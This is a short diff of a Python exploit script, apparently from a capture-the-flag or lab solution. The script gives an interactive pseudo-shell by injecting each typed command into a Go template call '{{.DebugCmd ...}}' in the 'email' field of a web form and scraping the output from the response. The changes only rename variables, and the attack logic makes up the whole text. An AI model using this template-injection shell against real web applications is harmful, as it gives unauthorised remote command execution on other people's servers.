@@ -7,15 +7,14 @@ while True:
     try:
         debug = '{{.DebugCmd "'
         command = input("$> ")
-        debug = debug + command + '"}}'
+        debug_cmd = debug + command + '"}}'
         data = {
-            "email":debug
+            "email":debug_cmd
         }
-        r = requests.post(url,data=data)
-        output = r.text
+        req_site = requests.post(url,data=data)
         search = re.compile(r"Email Sent To: (.*?)\s+<button class", re.DOTALL) 
-        result = search.search(output).group(1) 
-        print(result)
+        output_text = search.search(req_site.text).group(1)
+        print(output_text)
 
 
 
